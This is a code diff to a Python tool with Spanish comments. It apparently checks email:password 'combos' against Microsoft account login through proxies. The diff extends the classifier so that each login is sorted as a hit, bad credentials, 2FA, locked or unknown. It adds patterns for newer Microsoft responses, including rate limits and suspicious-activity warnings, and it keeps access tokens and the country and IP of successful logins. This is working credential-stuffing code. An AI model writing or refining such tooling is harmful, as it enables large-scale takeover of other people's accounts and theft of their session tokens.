@@ -459,7 +459,16 @@ def _get_ppft(session: requests.Session, email: str) -> tuple:
 def _classify_result(r, session: requests.Session) -> tuple:
     """Clasificar la respuesta del POST de login.
 
-    Retorna (status, access_token_or_None).
+    Estrategia:
+    1. access_token en URL final → HIT
+    2. Variantes modernas de "cuenta no existe" / "credenciales malas" → BAD
+    3. Páginas de 2FA / verify identity (muchas variantes) → 2FA
+    4. Páginas de cuenta bloqueada / suspendida / actividad sospechosa → LOCKED
+    5. Cookies ANON o WLSSC → HIT (sin token pero logueado)
+    6. Sino → UNKNOWN (con sample del body para diagnóstico)
+
+    Retorna (status, access_token_or_None, sample_or_None).
+    sample_or_None solo se setea cuando status == UNKNOWN (primeros 2000 chars del body).
     """
     body = r.text or ""
     final_url = str(r.url or "")
@@ -474,34 +483,82 @@ def _classify_result(r, session: requests.Session) -> tuple:
 
     # 1) HIT directo: access_token en la URL
     if access_token:
-        return STATUS_HIT, access_token
+        return STATUS_HIT, access_token, None
 
-    # 2) Examinar el body
+    # 2) Examinar el body (variantes modernas de Microsoft 2024-2026)
     low = body.lower()
 
-    if ("your account or password is incorrect" in low or
-        "that microsoft account doesn" in low or
-        "account doesn\\'t exist" in low):
-        return STATUS_BAD, None
+    # ── BAD: credenciales incorrectas o cuenta no existe (todas literales) ──
+    bad_patterns = (
+        "your account or password is incorrect",
+        "that microsoft account doesn",
+        "account doesn\\'t exist",
+        "we couldn't find an account",  # nueva variante 2025
+        "we can't find an account with that",  # otra variante
+        "enter the password for",  # Microsoft pide re-ingresar password
+        "the password is incorrect",  # nueva variante
+        "that password is incorrect",
+        "to sign in, you'll need a microsoft account",
+        "try again or reset your password",
+        "username isn't connected to an organization",
+    )
+    if any(p in low for p in bad_patterns):
+        return STATUS_BAD, None, None
 
-    if ("account.live.com/recover" in low or
-        "account.live.com/identity/confirm" in low or
-        "email/confirm" in low or
-        "proofs/verify" in low or
-        "verify your identity" in low):
-        return STATUS_2FA, None
+    # ── 2FA: verificación de identidad / step-up auth (algunas son regex) ──
+    twofa_literal = (
+        "account.live.com/recover",
+        "account.live.com/identity/confirm",
+        "email/confirm",
+        "proofs/verify",
+        "verify your identity",
+        "help us protect your account",
+        "we need to verify your identity",
+        "protect your account",
+        "enter the code we sent",
+        "enter the security code",
+        "verify it's really you",
+        "you've been blocked",
+    )
+    twofa_regex = (
+        r"approv[e]?\s+(?:this\s+)?sign[-\s]?in",
+        r"your\s+sign[-\s]?in\s+was\s+(?:un)?\s*usual",
+    )
+    if any(p in low for p in twofa_literal) or any(re.search(p, low) for p in twofa_regex):
+        return STATUS_2FA, None, None
 
-    if (",ac:null,urlfedconvertrename" in low or
-        "/cancel?mkt=" in body or
-        "/abuse?mkt=" in body):
-        return STATUS_LOCKED, None
+    # ── LOCKED: cuenta bloqueada / suspendida / abuse (algunas son regex) ──
+    locked_literal = (
+        ",ac:null,urlfedconvertrename",
+        "/cancel?mkt=",
+        "/abuse?mkt=",
+        "unusual sign-in activity",
+        "unusual sign in activity",
+        "we've detected some unusual activity",
+        "we have detected some unusual activity",
+        "your account has been flagged",
+        "someone might be using your account",
+        "to unlock your account",
+        "you've tried to sign in too many times",  # rate-limit temporal
+        "try again later",  # rate-limit
+    )
+    locked_regex = (
+        r"your\s+account\s+has\s+been\s+(?:temporarily\s+)?(?:suspended|locked|blocked)",
+        r"this\s+account\s+has\s+been\s+(?:suspended|locked|blocked)",
+        r"account\s+is\s+(?:temporarily\s+)?(?:suspended|locked|blocked)",
+    )
+    if any(p in low for p in locked_literal) or any(re.search(p, low) for p in locked_regex):
+        return STATUS_LOCKED, None, None
 
-    # 3) Fallback por cookies
+    # 3) Fallback por cookies ANON/WLSSC (login OK sin token en URL)
     cookie_names = {c.name for c in session.cookies}
     if {"ANON", "WLSSC"} & cookie_names:
-        return STATUS_HIT, None
+        return STATUS_HIT, None, None
 
-    return STATUS_UNKNOWN, None
+    # 4) UNKNOWN — devolver sample del body para diagnóstico
+    # (primeros 2000 chars sin HTML tags para que sea legible)
+    sample = body[:2000] if body else "(empty body)"
+    return STATUS_UNKNOWN, None, sample
 
 
 def _worker(combo: str, proxy: Optional[str] = None) -> Optional[dict]:
@@ -598,7 +655,7 @@ def _worker(combo: str, proxy: Optional[str] = None) -> Optional[dict]:
             return {"combo": combo, "status": STATUS_ERROR,
                     "error": str(e)[:200], "proxy": proxy or "direct"}
 
-        status, access_token = _classify_result(r, session)
+        status, access_token, unknown_sample = _classify_result(r, session)
 
         result = {
             "combo": combo,
@@ -606,6 +663,10 @@ def _worker(combo: str, proxy: Optional[str] = None) -> Optional[dict]:
             "access_token": access_token,
             "proxy": proxy or "direct",
         }
+
+        # Si es UNKNOWN, guardar el sample del body para diagnóstico
+        if status == STATUS_UNKNOWN and unknown_sample:
+            result["unknown_sample"] = unknown_sample
 
         # Si es HIT, extraer país + IP desde la cookie WLSSC
         if status == STATUS_HIT:
